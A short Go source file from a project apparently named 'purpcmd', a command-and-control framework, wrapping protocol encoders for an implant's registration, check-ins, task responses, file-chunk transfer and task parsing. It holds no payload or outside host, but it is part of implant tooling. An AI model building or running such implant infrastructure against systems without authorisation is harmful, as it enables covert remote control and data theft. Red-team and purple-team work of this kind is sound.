package core

import (
	"bytes"
	"io"
	"purpcmd/implant"
	"purpcmd/internal/protocol"
)

func PackMetadata(buff *bytes.Buffer, i *implant.ImplantMetadata) {
	protocol.WriteMetadata(buff, i)
}

func PackRegistration(i *implant.ImplantMetadata, key, iv [16]byte) []byte {
	return protocol.EncodeRegistration(i, key, iv)
}

func PackCheck(i *implant.ImplantMetadata) []byte {
	return protocol.EncodeCheck(i)
}

func PackResponse(i *implant.ImplantMetadata, payload []byte, TaskID [8]byte) []byte {
	return protocol.EncodeResponse(i, payload, TaskID)
}

func PackChunk(i *implant.ImplantMetadata, f string, c []byte, TaskID [8]byte) []byte {
	return protocol.EncodeChunk(i, f, c, TaskID)
}

func PackParseTask(buff io.Reader) ([8]byte, uint16, []byte) {
	task, err := protocol.DecodeTask(buff, protocol.DefaultMaxTaskPayload)
	if err != nil {
		return [8]byte{}, 0, nil
	}
	return task.ID, task.Code, task.Payload
}

func PackParseTaskChecked(buff io.Reader) ([8]byte, uint16, []byte, error) {
	task, err := protocol.DecodeTask(buff, protocol.DefaultMaxTaskPayload)
	return task.ID, task.Code, task.Payload, err
}
